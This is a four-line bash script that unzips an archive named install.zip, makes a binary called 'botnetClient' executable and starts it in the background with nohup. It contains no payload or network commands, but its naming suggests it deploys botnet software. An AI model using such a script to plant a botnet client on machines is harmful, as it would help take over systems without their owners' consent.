#!/bin/bash

unzip install.zip

chmod +x botnetClient

nohup ./botnetClient